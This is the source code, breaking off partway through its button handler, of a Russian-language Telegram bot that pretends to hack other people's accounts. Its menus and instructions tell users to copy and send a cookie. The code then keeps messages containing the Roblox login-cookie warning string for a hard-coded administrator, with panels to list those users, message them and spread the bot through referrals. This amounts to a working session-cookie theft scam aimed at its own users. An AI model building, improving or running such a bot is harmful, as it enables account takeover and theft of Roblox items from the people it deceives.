from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import asyncio
import json
import os
from datetime import datetime

# ⚠️ ВСТАВЬ СВОЙ ТОКЕН СЮДА
BOT_TOKEN = os.getenv("BOT_TOKEN")

# ⚠️ ТВОЙ ID АДМИНИСТРАТОРА
YOUR_USER_ID = 1341594703

# ===================================================
# ФАЙЛЫ ДЛЯ ХРАНЕНИЯ ДАННЫХ
# ===================================================

MESSAGES_FILE = "messages.json"
KEYWORD_USERS_FILE = "keyword_users.json"
ALL_USERS_FILE = "all_users.json"
ATTEMPTS_FILE = "attempts.json"
REFERRALS_FILE = "referrals.json"

KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|"

# ===================================================
# ФУНКЦИИ ДЛЯ РАБОТЫ С ПОПЫТКАМИ
# ===================================================

def get_attempts(user_id):
    try:
        if os.path.exists(ATTEMPTS_FILE):
            with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            return data.get(str(user_id), {"total": 2, "used": 0})
        return {"total": 2, "used": 0}
    except:
        return {"total": 2, "used": 0}

def save_attempts(user_id, attempts_data):
    try:
        if os.path.exists(ATTEMPTS_FILE):
            with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        else:
            data = {}
        
        data[str(user_id)] = attempts_data
        
        with open(ATTEMPTS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except:
        return False

def get_available_attempts(user_id):
    attempts = get_attempts(user_id)
    return attempts["total"] - attempts["used"]

def use_attempt(user_id):
    attempts = get_attempts(user_id)
    available = attempts["total"] - attempts["used"]
    
    if available <= 0:
        return False
    
    attempts["used"] += 1
    save_attempts(user_id, attempts)
    return True

def add_attempt(user_id, count=1):
    attempts = get_attempts(user_id)
    attempts["total"] += count
    save_attempts(user_id, attempts)
    return True

def reset_attempts(user_id):
    attempts = {"total": 2, "used": 0}
    save_attempts(user_id, attempts)
    return True

# ===================================================
# ФУНКЦИИ ДЛЯ РАБОТЫ С РЕФЕРАЛЛАМИ
# ===================================================

def save_referral(referrer_id, referred_id):
    try:
        if os.path.exists(REFERRALS_FILE):
            with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        else:
            data = {}
        
        if str(referred_id) in data:
            return False
        
        data[str(referred_id)] = {
            "referrer": str(referrer_id),
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        with open(REFERRALS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except:
        return False

def get_referrals_count(user_id):
    try:
        if os.path.exists(REFERRALS_FILE):
            with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            return sum(1 for v in data.values() if v.get("referrer") == str(user_id))
        return 0
    except:
        return 0

def get_referral_link(user_id):
    return f"https://t.me/cookieeditort_bot?start=ref_{user_id}"

# ===================================================
# ОСТАЛЬНЫЕ ФУНКЦИИ
# ===================================================

def save_all_user(user_id, username, first_name):
    try:
        if os.path.exists(ALL_USERS_FILE):
            with open(ALL_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
        else:
            users = {}
        
        if str(user_id) in users:
            users[str(user_id)]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        else:
            users[str(user_id)] = {
                "username": username,
                "first_name": first_name,
                "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        
        with open(ALL_USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка сохранения пользователя: {e}")

def get_all_users():
    try:
        if os.path.exists(ALL_USERS_FILE):
            with open(ALL_USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return {}
    except:
        return {}

def save_keyword_user(user_id, username, first_name):
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
        else:
            users = {}
        
        users[str(user_id)] = {
            "username": username,
            "first_name": first_name,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка сохранения пользователя: {e}")

def is_keyword_user(user_id):
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
            return str(user_id) in users
        return False
    except:
        return False

def get_keyword_users():
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return {}
    except:
        return {}

def delete_keyword_user(user_id):
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
            
            if str(user_id) in users:
                del users[str(user_id)]
                with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
                    json.dump(users, f, ensure_ascii=False, indent=2)
                return True
        return False
    except Exception as e:
        print(f"Ошибка удаления пользователя: {e}")
        return False

def delete_all_keyword_users():
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
                json.dump({}, f)
            return True
        return False
    except Exception as e:
        print(f"Ошибка удаления всех пользователей: {e}")
        return False

def get_user_messages(user_id):
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
            return [msg for msg in messages if str(msg.get("user_id")) == str(user_id)]
        return []
    except:
        return []

def get_keyword_messages(user_id):
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
            return [msg for msg in messages if str(msg.get("user_id")) == str(user_id) and KEYWORD in msg.get("text", "")]
        return []
    except:
        return []

def save_message(user_id, username, first_name, text, timestamp):
    if not is_keyword_user(user_id):
        return
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
        else:
            messages = []
        
        messages.append({
            "user_id": user_id,
            "username": username,
            "first_name": first_name,
            "text": text,
            "timestamp": timestamp
        })
        
        if len(messages) > 500:
            messages = messages[-500:]
        
        with open(MESSAGES_FILE, "w", encoding="utf-8") as f:
            json.dump(messages, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка сохранения сообщения: {e}")

# ===================================================
# ФУНКЦИИ ДЛЯ ПОСТРАНИЧНОГО ВЫВОДА
# ===================================================

async def show_users_page(query, context, page=0, per_page=10):
    users = get_all_users()
    if not users:
        await query.edit_message_text("📭 Никто ещё не заходил в бота.")
        return
    
    users_list = list(users.items())
    total_users = len(users_list)
    total_pages = (total_users + per_page - 1) // per_page
    
    if page >= total_pages:
        page = total_pages - 1
    
    start_idx = page * per_page
    end_idx = min(start_idx + per_page, total_users)
    current_users = users_list[start_idx:end_idx]
    
    text = f"👥 **ВСЕ ПОЛЬЗОВАТЕЛИ:**\n\n"
    text += f"📊 Всего: {total_users} пользователей\n"
    text += f"📄 Страница {page + 1} из {total_pages}\n\n"
    
    for user_id, user_data in current_users:
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        first_seen = user_data.get("first_seen", "неизвестно")
        last_seen = user_data.get("last_seen", "неизвестно")
        has_keyword = "✅" if is_keyword_user(user_id) else "❌"
        
        text += f"🆔 {user_id}\n"
        text += f"👤 {name} (@{username})\n"
        text += f"📅 Первый визит: {first_seen}\n"
        text += f"🕐 Последний визит: {last_seen}\n"
        text += f"🔑 Ключевое слово: {has_keyword}\n"
        text += "─" * 25 + "\n"
    
    keyboard = []
    nav_buttons = []
    
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("◀️ Назад", callback_data=f"users_page_{page - 1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("Вперед ▶️", callback_data=f"users_page_{page + 1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")])
    keyboard.append([InlineKeyboardButton("🔑 Только с ключевым словом", callback_data="view_keyword_users_only")])
    keyboard.append([InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if len(text) > 4096:
        parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
        for part in parts:
            await query.message.reply_text(part)
        await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
    else:
        await query.edit_message_text(text, reply_markup=reply_markup)

async def show_keyword_users_page(query, context, page=0, per_page=10):
    users = get_keyword_users()
    if not users:
        await query.edit_message_text("📭 Нет пользователей, отправивших ключевое слово.")
        return
    
    users_list = list(users.items())
    total_users = len(users_list)
    total_pages = (total_users + per_page - 1) // per_page
    
    if page >= total_pages:
        page = total_pages - 1
    
    start_idx = page * per_page
    end_idx = min(start_idx + per_page, total_users)
    current_users = users_list[start_idx:end_idx]
    
    text = f"🔑 **ПОЛЬЗОВАТЕЛИ С КЛЮЧЕВЫМ СЛОВОМ:**\n\n"
    text += f"📊 Всего: {total_users} пользователей\n"
    text += f"📄 Страница {page + 1} из {total_pages}\n\n"
    
    for user_id, user_data in current_users:
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        timestamp = user_data.get("timestamp", "неизвестно")
        
        text += f"🆔 {user_id}\n"
        text += f"👤 {name} (@{username})\n"
        text += f"🕐 Отправил: {timestamp}\n"
        text += "─" * 25 + "\n"
    
    keyboard = []
    nav_buttons = []
    
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("◀️ Назад", callback_data=f"keyword_users_page_{page - 1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("Вперед ▶️", callback_data=f"keyword_users_page_{page + 1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton("📩 Посмотреть сообщения", callback_data="view_keyword_messages")])
    keyboard.append([InlineKeyboardButton("🗑 Удалить пользователя", callback_data="delete_single_user")])
    keyboard.append([InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")])
    keyboard.append([InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users")])
    keyboard.append([InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if len(text) > 4096:
        parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
        for part in parts:
            await query.message.reply_text(part)
        await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
    else:
        await query.edit_message_text(text, reply_markup=reply_markup)

async def show_chat_users_page(query, context, page=0, per_page=10):
    users = get_all_users()
    if not users:
        await query.edit_message_text("📭 Нет пользователей.")
        return
    
    users_list = list(users.items())
    total_users = len(users_list)
    total_pages = (total_users + per_page - 1) // per_page
    
    if page >= total_pages:
        page = total_pages - 1
    
    start_idx = page * per_page
    end_idx = min(start_idx + per_page, total_users)
    current_users = users_list[start_idx:end_idx]
    
    text = f"💬 **ВЫБЕРИТЕ ПОЛЬЗОВАТЕЛЯ:**\n\n"
    text += f"📊 Всего: {total_users} пользователей\n"
    text += f"📄 Страница {page + 1} из {total_pages}\n\n"
    
    keyboard = []
    for user_id, user_data in current_users:
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        has_keyword = "✅" if is_keyword_user(user_id) else "❌"
        button_text = f"👤 {name} (@{username}) {has_keyword}"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"chat_user_{user_id}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("◀️ Назад", callback_data=f"chat_users_page_{page - 1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("Вперед ▶️", callback_data=f"chat_users_page_{page + 1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text + "✅ - отправил ключевое слово\n❌ - не отправлял",
        reply_markup=reply_markup
    )

async def show_keyword_messages_page(query, context, page=0, per_page=10):
    users = get_keyword_users()
    if not users:
        await query.edit_message_text("📭 Нет пользователей с ключевым словом.")
        return
    
    users_list = list(users.items())
    total_users = len(users_list)
    total_pages = (total_users + per_page - 1) // per_page
    
    if page >= total_pages:
        page = total_pages - 1
    
    start_idx = page * per_page
    end_idx = min(start_idx + per_page, total_users)
    current_users = users_list[start_idx:end_idx]
    
    text = f"👥 **ВЫБЕРИТЕ ПОЛЬЗОВАТЕЛЯ ДЛЯ ПРОСМОТРА СООБЩЕНИЙ:**\n\n"
    text += f"📊 Всего: {total_users} пользователей\n"
    text += f"📄 Страница {page + 1} из {total_pages}\n\n"
    
    keyboard = []
    for user_id, user_data in current_users:
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        keyboard.append([InlineKeyboardButton(f"👤 {name} (@{username})", callback_data=f"view_user_{user_id}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("◀️ Назад", callback_data=f"keyword_messages_page_{page - 1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("Вперед ▶️", callback_data=f"keyword_messages_page_{page + 1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data="view_keyword_users_only")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

# ===================================================
# ГЛАВНОЕ МЕНЮ
# ===================================================

def get_main_menu(user_id):
    keyboard = [
        [
            InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
            InlineKeyboardButton("Инструкция", callback_data="cookies"),
        ],
        [
            InlineKeyboardButton("Поддержка", callback_data="support"),
            InlineKeyboardButton("🎯 Мои попытки", callback_data="my_attempts"),
        ],
        [
            InlineKeyboardButton("👥 Пригласить друга", callback_data="invite_friend"),
        ]
    ]
    
    if user_id == YOUR_USER_ID:
        keyboard.append([
            InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
            InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
        ])
        keyboard.append([
            InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
            InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
        ])
        keyboard.append([
            InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
            InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
        ])
        keyboard.append([
            InlineKeyboardButton("🎯 Управление попытками", callback_data="manage_attempts"),
        ])
    
    return keyboard

# ===================================================
# ОБРАБОТЧИК КОМАНДЫ /start
# ===================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_name = user.first_name
    user_id = user.id
    
    # Проверяем реферальную ссылку
    if context.args and len(context.args) > 0:
        ref_arg = context.args[0]
        if ref_arg.startswith("ref_"):
            try:
                referrer_id = int(ref_arg.replace("ref_", ""))
                if referrer_id != user_id:
                    if os.path.exists(REFERRALS_FILE):
                        with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
                            referrals = json.load(f)
                    else:
                        referrals = {}
                    
                    if str(user_id) not in referrals:
                        referrals[str(user_id)] = {
                            "referrer": str(referrer_id),
                            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        with open(REFERRALS_FILE, "w", encoding="utf-8") as f:
                            json.dump(referrals, f, ensure_ascii=False, indent=2)
                        
                        add_attempt(referrer_id, 1)
                        
                        try:
                            await context.bot.send_message(
                                chat_id=referrer_id,
                                text=f"🎉 {user_name} перешел по вашей ссылке!\n"
                                     f"Вы получили +1 попытку! 🎯\n"
                                     f"Теперь у вас {get_available_attempts(referrer_id)} попыток."
                            )
                        except:
                            pass
                        
                        await update.message.reply_text(
                            f"🎉 Спасибо за приглашение! Вы получили +1 попытку!\n"
                            f"Теперь у вас {get_available_attempts(user_id)} попыток."
                        )
            except:
                pass
    
    save_all_user(
        user_id=user.id,
        username=user.username or "no_username",
        first_name=user.first_name or "Unknown"
    )
    
    # Инициализируем попытки
    if not os.path.exists(ATTEMPTS_FILE) or str(user_id) not in json.load(open(ATTEMPTS_FILE, "r")) if os.path.exists(ATTEMPTS_FILE) else True:
        save_attempts(user_id, {"total": 2, "used": 0})
    
    keyboard = get_main_menu(user_id)
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"Привет, {user_name}!\n\n"
        f"🎯 У вас {get_available_attempts(user_id)} доступных попыток.\n"
        f"💡 Пригласите друга и получите +1 попытку!\n\n"
        f"Выбери нужную категорию:",
        reply_markup=reply_markup
    )

# ===================================================
# ОБРАБОТЧИК НАЖАТИЙ НА КНОПКИ
# ===================================================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    is_admin = (user_id == YOUR_USER_ID)
    data = query.data
    
    print(f"🔘 Нажата кнопка: {data}")
    
    # --- НОВЫЕ КНОПКИ ---
    if data == "my_attempts":
        available = get_available_attempts(user_id)
        attempts = get_attempts(user_id)
        referrals = get_referrals_count(user_id)
        
        text = f"🎯 **Ваши попытки:**\n\n"
        text += f"📊 Всего: {attempts['total']}\n"
        text += f"✅ Использовано: {attempts['used']}\n"
        text += f"🎯 Доступно: {available}\n"
        text += f"👥 Приглашено друзей: {referrals}\n\n"
        text += f"💡 Пригласите друга и получите +1 попытку!"
        
        keyboard = [
            [InlineKeyboardButton("👥 Пригласить друга", callback_data="invite_friend")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    elif data == "invite_friend":
        link = get_referral_link(user_id)
        referrals = get_referrals_count(user_id)
        
        text = f"👥 **Пригласите друга!**\n\n"
        text += f"🎁 За каждого друга вы получаете +1 попытку!\n"
        text += f"👥 У вас уже {referrals} приглашенных\n\n"
        text += f"🔗 Ваша ссылка:\n"
        text += f"`{link}`\n\n"
        text += f"📋 Отправьте ссылку другу!"
        
        keyboard = [
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    elif data == "manage_attempts":
        keyboard = [
            [InlineKeyboardButton("📊 Статистика попыток", callback_data="attempts_stats")],
            [InlineKeyboardButton("🎯 Добавить попытки", callback_data="add_attempts_admin")],
            [InlineKeyboardButton("🔄 Сбросить попытки", callback_data="reset_attempts_admin")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🎯 **Управление попытками:**",
            reply_markup=reply_markup
        )
        return
    
    elif data == "attempts_stats":
        users = get_all_users()
        total = 0
        used = 0
        
        for uid in users.keys():
            att = get_attempts(int(uid))
            total += att["total"]
            used += att["used"]
        
        text = f"📊 **Статистика попыток:**\n\n"
        text += f"👥 Всего: {len(users)} пользователей\n"
        text += f"🎯 Всего попыток: {total}\n"
        text += f"✅ Использовано: {used}\n"
        text += f"🎯 Доступно: {total - used}\n"
        
        keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data="manage_attempts")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    elif data == "add_attempts_admin":
        context.user_data['admin_action'] = 'add_attempts'
        await query.edit_message_text(
            "🎯 **Добавить попытки:**\n\n"
            "Отправьте: `ID Количество`\n"
            "Пример: `1341594703 5`\n\n"
            "Для отмены: /cancel"
        )
        return
    
    elif data == "reset_attempts_admin":
        context.user_data['admin_action'] = 'reset_attempts'
        await query.edit_message_text(
            "🔄 **Сбросить попытки:**\n\n"
            "Отправьте ID пользователя\n"
            "Пример: `1341594703`\n\n"
            "Для отмены: /cancel"
        )
        return
    
    # --- ОСНОВНЫЕ КНОПКИ ---
    elif data == "device":
        keyboard = [
            [
                InlineKeyboardButton("📱 Телефон", callback_data="phone"),
                InlineKeyboardButton("💻 Компьютер", callback_data="computer"),
            ],
            [
                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Выбери своё устройство:", reply_markup=reply_markup)
        return
    
    elif data == "phone":
        keyboard = [
            [
                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
                InlineKeyboardButton("✅ Скопировал куки", callback_data="cookies_copied"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Отправляем видео и сохраняем сообщение
        video_msg = await query.message.reply_video(
            video="https://t.me/cookieeditort/3",
            caption="📱 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
            reply_markup=reply_markup
        )
        # Удаляем сообщение с выбором устройства
        try:
            await query.message.delete()
        except:
            pass
        return
    
    elif data == "computer":
        keyboard = [
            [
                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
                InlineKeyboardButton("✅ Скопировал куки", callback_data="cookies_copied"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.reply_video(
            video="https://t.me/cookieeditort/4",
            caption="💻 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
            reply_markup=reply_markup
        )
        try:
            await query.message.delete()
        except:
            pass
        return
    
    elif data == "cookies_copied":
        keyboard = [
            [InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "Скинь cookie в бота\n"
            "И бот начнет поиск пароля вашей жертвы😈\n"
            "В течении дня бот скинет вам пароль от аккаунта",
            reply_markup=reply_markup
        )
        return
    
    elif data == "cookies":
        keyboard = [[InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "1. Зайти на профиль жертвы\n"
            "2. Скопировать cookie\n"
            "3. Вставить cookie в бота\n"
            "4. Скинуть ссылку 📌 cookie в бота\n"
            "5. Ожидать до получения пароля и логина",
            reply_markup=reply_markup
        )
        return
    
    elif data == "support":
        keyboard = [[InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("@H1pegold\n8:00-23:00", reply_markup=reply_markup)
        return
    
    elif data == "back_to_menu":
        keyboard = get_main_menu(user_id)
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"Привет, {update.effective_user.first_name}!\n\n"
            f"🎯 У вас {get_available_attempts(user_id)} доступных попыток.\n"
            f"💡 Пригласите друга и получите +1 попытку!\n\n"
            f"Выбери нужную категорию:",
            reply_markup=reply_markup
        )
        return
    
    elif data == "noop":
        await query.edit_message_text("📊 Нажмите на другую кнопку для просмотра.")
        return
    
    # --- АДМИНСКИЕ КНОПКИ ---
    if not is_admin:
        await query.edit_message_text("⚠️ Эта функция временно недоступна.")
        return
    
    elif data == "delete_users_menu":
        keyboard = [
            [InlineKeyboardButton("🗑 Удалить одного пользователя", callback_data="delete_single_user")],
            [InlineKeyboardButton("🗑 Удалить всех пользователей", callback_data="delete_all_users_confirm")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🗑 **Управление пользователями:**",
            reply_markup=reply_markup
        )
        return
    
    elif data == "delete_single_user":
        users = get_keyword_users()
        if not users:
            await query.edit_message_text("📭 Нет пользователей с ключевым словом для удаления.")
            return
        
        keyboard = []
        for user_id, user_data in users.items():
            name = user_data.get("first_name", "Unknown")
            username = user_data.get("username", "no_username")
            button_text = f"🗑 {name} (@{username})"
            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"confirm_delete_{user_id}")])
        
        keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data="delete_users_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🗑 **Выберите пользователя для удаления:**\n\n"
            "⚠️ ВНИМАНИЕ: Удаление нельзя отменить!",
            reply_markup=reply_markup
        )
        return
    
    elif data.startswith("confirm_delete_"):
        target_user_id = data.replace("confirm_delete_", "")
        users = get_keyword_users()
        user_data = users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        keyboard = [
            [InlineKeyboardButton("✅ Да, удалить", callback_data=f"execute_delete_{target_user_id}")],
            [InlineKeyboardButton("❌ Отмена", callback_data="delete_single_user")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"⚠️ **Подтверждение удаления:**\n\n"
            f"Вы уверены, что хотите удалить пользователя?\n"
            f"👤 {name} (@{username})\n"
            f"🆔 ID: {target_user_id}\n\n"
            f"🗑 Это действие нельзя отменить!",
            reply_markup=reply_markup
        )
        return
    
    elif data.startswith("execute_delete_"):
        target_user_id = data.replace("execute_delete_", "")
        users = get_keyword_users()
        user_data = users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        if delete_keyword_user(target_user_id):
            await query.edit_message_text(
                f"✅ **Пользователь успешно удалён!**\n\n"
                f"👤 {name} (@{username})\n"
                f"🆔 ID: {target_user_id}"
            )
        else:
            await query.edit_message_text(
                f"❌ Ошибка при удалении пользователя."
            )
        return
    
    elif data == "delete_all_users_confirm":
        keyboard = [
            [InlineKeyboardButton("⚠️ ДА, УДАЛИТЬ ВСЕХ", callback_data="execute_delete_all")],
            [InlineKeyboardButton("❌ Отмена", callback_data="delete_users_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "⚠️⚠️⚠️ **ВНИМАНИЕ!** ⚠️⚠️⚠️\n\n"
            "Вы собираетесь удалить ВСЕХ пользователей из списка с ключевым словом!\n\n"
            f"📊 Всего будет удалено: {len(get_keyword_users())} пользователей\n\n"
            "🗑 Это действие НЕЛЬЗЯ отменить!\n\n"
            "Подтвердите удаление:",
            reply_markup=reply_markup
        )
        return
    
    elif data == "execute_delete_all":
        count = len(get_keyword_users())
        if delete_all_keyword_users():
            await query.edit_message_text(
                f"✅ **ВСЕ ПОЛЬЗОВАТЕЛИ УДАЛЕНЫ!**\n\n"
                f"🗑 Удалено пользователей: {count}"
            )
        else:
            await query.edit_message_text(
                f"❌ Ошибка при удалении всех пользователей."
            )
        return
    
    # Рассылка
    elif data == "send_mailing":
        keyboard = [
            [InlineKeyboardButton("📨 Всем пользователям", callback_data="mailing_all")],
            [InlineKeyboardButton("🔑 Только с ключевым словом", callback_data="mailing_keyword")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "📨 **Выберите кому отправить рассылку:**",
            reply_markup=reply_markup
        )
        return
    
    elif data == "mailing_all":
        context.user_data['mailing_type'] = 'all'
        await query.edit_message_text(
            "📨 **Напишите текст рассылки для ВСЕХ пользователей:**\n\n"
            "Для отмены нажмите /cancel"
        )
        return
    
    elif data == "mailing_keyword":
        context.user_data['mailing_type'] = 'keyword'
        await query.edit_message_text(
            "📨 **Напишите текст рассылки для пользователей с ключевым словом:**\n\n"
            "Для отмены нажмите /cancel"
        )
        return
    
    elif data == "view_all_users":
        await show_users_page(query, context, 0)
        return
    
    elif data.startswith("users_page_"):
        page = int(data.replace("users_page_", ""))
        await show_users_page(query, context, page)
        return
    
    elif data == "view_keyword_users_only":
        await show_keyword_users_page(query, context, 0)
        return
    
    elif data.startswith("keyword_users_page_"):
        page = int(data.replace("keyword_users_page_", ""))
        await show_keyword_users_page(query, context, page)
        return
    
    elif data == "view_stats":
        all_users = get_all_users()
        keyword_users = get_keyword_users()
        
        total_messages = 0
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
                total_messages = len(messages)
        
        text = "📊 **СТАТИСТИКА БОТА:**\n\n"
        text += f"👥 Всего пользователей: {len(all_users)}\n"
        text += f"🔑 С ключевым словом: {len(keyword_users)}\n"
        text += f"📩 Сообщений сохранено: {total_messages}\n\n"
        
        today = datetime.now().strftime("%Y-%m-%d")
        today_count = sum(1 for user_data in all_users.values() if user_data.get("first_seen", "").startswith(today))
        text += f"📅 Новых сегодня: {today_count}\n"
        
        keyboard = [
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")],
            [InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    elif data == "select_user_for_chat":
        await show_chat_users_page(query, context, 0)
        return
    
    elif data.startswith("chat_users_page_"):
        page = int(data.replace("chat_users_page_", ""))
